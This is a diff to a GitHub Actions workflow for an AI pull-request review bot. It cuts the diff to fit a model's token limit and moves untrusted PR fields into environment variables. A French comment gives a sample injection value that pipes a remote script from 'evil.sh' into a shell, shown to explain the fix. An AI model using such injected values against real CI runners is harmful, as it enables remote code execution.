@@ -29,19 +29,34 @@ jobs:
         with:
           fetch-depth: 0
 
+      # Budget de requête : GitHub Models plafonne gpt-4o à 8000 tokens de corps de
+      # requête (`413 Request body too large`). Un diff est dense (~3 caractères par
+      # token) : les 30000 caractères d'origine pesaient ~10000 tokens à eux seuls, donc
+      # le bot échouait sur TOUTE PR un peu grosse — silencieusement inutile là où il
+      # servait le plus. Enveloppe visée ≈ 4800 tokens, avec de la marge.
+      #
+      # PR_BODY passe par l'ENV, jamais par une interpolation `${{ }}` dans le script :
+      # un corps de PR contenant `"; curl evil.sh | sh #` serait sinon exécuté sur le
+      # runner (script injection — le corps de PR est une entrée non fiable).
       - name: Compute diff
         id: diff
+        env:
+          PR_BODY: ${{ github.event.pull_request.body }}
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
         run: |
-          git fetch origin ${{ github.event.pull_request.base.ref }}
-          STAT=$(git diff origin/${{ github.event.pull_request.base.ref }}...HEAD --stat | head -50)
-          # Truncate full diff to 30K chars to fit free-tier context
-          FULL=$(git diff origin/${{ github.event.pull_request.base.ref }}...HEAD | head -c 30000)
+          git fetch origin "$BASE_REF"
+          STAT=$(git diff "origin/$BASE_REF...HEAD" --stat | head -30)
+          FULL=$(git diff "origin/$BASE_REF...HEAD" | head -c 10000)
+          BODY=$(printf '%s' "$PR_BODY" | head -c 1500)
           {
             echo "stat<<EOF"
             echo "$STAT"
             echo "EOF"
             echo "full<<EOF"
             echo "$FULL"
+            echo "EOF"
+            echo "body<<EOF"
+            echo "$BODY"
             echo "EOF"
           } >> $GITHUB_OUTPUT
 
@@ -76,7 +91,7 @@ jobs:
             PR title: ${{ github.event.pull_request.title }}
 
             PR body:
-            ${{ github.event.pull_request.body }}
+            ${{ steps.diff.outputs.body }}
 
             Diff stat:
             ${{ steps.diff.outputs.stat }}
